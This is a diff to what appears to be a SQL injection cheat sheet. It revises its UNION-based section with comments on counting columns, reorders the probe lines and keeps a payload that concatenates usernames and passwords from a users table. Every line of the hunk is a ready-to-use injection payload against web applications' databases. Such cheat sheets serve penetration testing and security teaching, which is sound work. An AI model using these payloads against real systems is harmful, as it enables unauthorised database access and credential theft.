@@ -174,23 +174,26 @@ admin') or '1'='1'/*
 
 ```sql
 SELECT a, b FROM table1 UNION SELECT c, d FROM table2    --- Basic usage, must be same # columns and same data type
---- method 1 to determine # of columns
+--- method 1 to determine # of columns, error=columns are #-1
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
---- method 2 to determine # of columns
+--- method 2 to determine # of columns, no error=columns are #
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT username,2--
-' UNION SELECT username,2,3--
-' UNION SELECT username,2,3,4--
-' UNION SELECT NULL FROM DUAL-- Oracle specific, SELECT must use FROM query
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT NULL FROM DUAL--            Oracle specific, SELECT must use FROM query
 --- Find columns with useful data type
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
+' UNION SELECT username,2--
+' UNION SELECT username,2,3--
+' UNION SELECT username,2,3,4--
 --- retrieve multiple values within a single column
 ' UNION SELECT username || ':' || password FROM users--
 
